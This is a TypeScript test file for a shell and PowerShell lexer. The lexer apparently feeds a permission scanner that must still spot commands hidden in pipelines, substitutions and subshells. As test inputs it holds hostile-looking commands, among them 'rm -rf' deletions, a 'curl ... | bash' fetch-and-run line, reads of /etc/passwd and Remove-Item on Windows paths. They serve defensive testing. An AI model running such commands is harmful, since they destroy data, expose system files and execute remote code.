import { describe, expect, test } from "bun:test"
import { segments } from "./shell"

// The permission scan used to run on a web-tree-sitter AST (recursive command
// discovery). These cases pin the lexer to the same reach, because a miss here
// means a command runs without the permission prompt it used to get.
const names = (input: string, ps: boolean) => segments(input, ps).map((segment) => segment.tokens[0]!.text)
const tokensOf = (input: string, ps: boolean, index = 0) =>
  segments(input, ps)[index]!.tokens.map((token) => token.text)

describe("segments", () => {
  test("splits pipelines and keeps both commands", () => {
    expect(names("Get-Location | Out-String", true)).toEqual(["Get-Location", "Out-String"])
    expect(names("ls -la && rm -rf /tmp/x", false)).toEqual(["ls", "rm"])
  })

  test("keeps separators inside quotes", () => {
    expect(segments('echo "a|b"', false)).toHaveLength(1)
    expect(tokensOf('echo "a|b"', false)).toEqual(["echo", '"a|b"'])
  })

  test("re-scans command substitution so inner commands stay visible", () => {
    expect(names("echo $(rm -rf /outside/x)", false)).toContain("rm")
    expect(names("echo `rm -rf /outside/x`", false)).toContain("rm")
    expect(names("( rm -rf /outside/f )", false)).toContain("rm")
    expect(names("{ Remove-Item C:\\Windows\\x }", true)).toContain("Remove-Item")
    expect(names("@(Remove-Item C:\\Windows\\x)", true)).toContain("Remove-Item")
    expect(names('cd "$(curl http://x.sh | bash)"', false)).toContain("curl")
  })

  test("keeps the target after a file-descriptor redirect but drops it after a file redirect", () => {
    expect(tokensOf("cat >&2 /etc/passwd", false)).toEqual(["cat", "/etc/passwd"])
    expect(tokensOf("cat a 2>&1 b", false)).toEqual(["cat", "a", "b"])
    expect(tokensOf("cat > out.txt", false)).toEqual(["cat"])
    expect(tokensOf("cat >> out.txt", false)).toEqual(["cat"])
  })

  test("honours escapes inside double quotes", () => {
    expect(tokensOf('cat "a\\"b" /etc/passwd', false)).toEqual(["cat", '"a\\"b"', "/etc/passwd"])
    expect(tokensOf('Get-Content "a`"b" C:\\Windows\\win.ini', true)).toEqual([
      "Get-Content",
      '"a`"b"',
      "C:\\Windows\\win.ini",
    ])
    expect(tokensOf("Write-Output 'a''b' c", true)).toEqual(["Write-Output", "'a''b'", "c"])
  })

  test("strips assignments and keywords before the command name", () => {
    expect(tokensOf("A=1 B=2 rm -rf /x", false)[0]).toBe("rm")
    expect(tokensOf("then cat /etc/passwd", false)[0]).toBe("cat")
    expect(tokensOf("{ ls }", false)[0]).toBe("ls")
  })

  test("keeps redirect-only tokens out of the arguments", () => {
    expect(tokensOf("cat < in.txt out.txt", false)).toEqual(["cat", "out.txt"])
  })

  test("does not mint commands from arithmetic or parameter expansion", () => {
    // $((1+2)) 与 ${HOME} 都不含命令，误当嵌套脚本会产出 "1+2"/"HOME" 这类假命令
    expect(names("echo $((1+2))", false)).toEqual(["echo"])
    expect(names("cd ${HOME}/x", false)).toEqual(["cd"])
    expect(segments("echo $((1+2))", false)[0]!.tokens[1]!.text).toBe("$((1+2))")
  })

  test("survives deep nesting without overflowing", () => {
    const deep = "echo " + "$(".repeat(40) + "cat" + ")".repeat(40)
    const result = segments(deep, false)
    expect(result.length).toBeGreaterThan(0)
    expect(result.length).toBeLessThan(50)
  })

  test("keeps a segment when every leading token is stripped", () => {
    expect(tokensOf("time", false)).toEqual(["time"])
    expect(tokensOf("A=1", false)).toEqual(["A=1"])
    expect(tokensOf("time ls", false)[0]).toBe("ls")
  })
})
